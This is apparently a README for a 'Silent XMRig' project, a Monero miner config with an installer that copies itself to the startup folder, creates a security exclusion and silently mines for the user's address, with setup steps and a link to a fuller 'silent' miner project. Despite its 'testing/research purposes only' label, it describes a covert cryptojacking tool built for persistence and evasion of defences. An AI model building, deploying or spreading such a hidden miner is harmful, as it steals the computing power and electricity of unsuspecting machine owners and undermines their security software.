# Silent XMRig
Silent XMRig miner config with installer and startup.

This project is loosely put together, you should consider using this more complete project instead: [https://github.com/UnamSanctam/SilentCryptoMiner](https://github.com/UnamSanctam/SilentCryptoMiner)

# This project is intended for testing/research purposes only.

# Setup

You will start by needing a Monero address and a monero mining pool, (MoneroOcean is default).

1. Navigate to xmrig/config.json and edit the following lines:

```json
{
   "url": "gulf.moneroocean.stream:10128 ", # mining pool url (leave as default if you don't know what a mining pool is)
   "user": "MONERO-ADDRESS-HERE", # your Monero address
   "pass": "rig", # name of the machine that will be displayed on the mining pool
}
```

2. Setup Complete!

# Usage

1. Run start.bat. The installer will copy itself to the startup folder, create an exclusion for it and will silently start mining Monero for you.
2. If you did not change the mining pool line in config.json, head over to https://moneroocean.stream/ and enter your Monero address, you should start earning after a few minutes.
